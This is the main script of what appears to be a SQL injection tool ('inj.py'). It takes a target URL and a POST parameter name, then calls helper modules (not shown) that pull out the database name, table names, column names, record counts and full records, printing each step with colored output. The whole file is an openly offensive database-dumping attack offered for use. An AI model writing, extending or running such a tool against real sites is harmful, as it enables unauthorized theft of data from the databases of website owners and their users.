import sys
from colorama import Fore,init;init()
from app.banner import banner
from app.charg import check_arg
from app.database import get_dbname
from app.get_tables import tables
from app.column import get_columns
from app.count_records import count_record
from app.records import get_records


if(__name__ != "__main__"):
    sys.exit()
else:
    pass

try:
    target_url = sys.argv[1]
    param_name = sys.argv[2]

except:
    print(Fore.RED + "Missing  arguments !")
    print(Fore.LIGHTBLACK_EX + "usage : python3 inj.py [target url] [post param name]")
    sys.exit()


if(check_arg(target_url) == 1):
    pass
else:
    print(Fore.RED + "invalid url ! ex  http://localhost/api/index.php")
    sys.exit()

print(Fore.YELLOW + banner.__doc__)

dbname = get_dbname(target_url,param_name)  #mybe you should edit this part (in database.py)
print("\n\n")
tables_name = tables(target_url,param_name,dbname)   #mybe you should edit this part (in get_tables.py)

tables_columns = {}

for table_name in tables_name:
    print(Fore.LIGHTMAGENTA_EX + f"\n\n[*] dumping columns name of table [ {table_name} ]")
    new_get_ct = get_columns(target_url,param_name,table_name,dbname)
    tables_columns.update({table_name:new_get_ct})

for t in tables_columns:
    for c in tables_columns[t]:
        count = count_record(target_url,param_name,t,c)
        print(Fore.LIGHTYELLOW_EX + f"\n\n table {t} has {count} records")
        
        get_records(target_url,param_name,t,c,tables_columns[t])

        break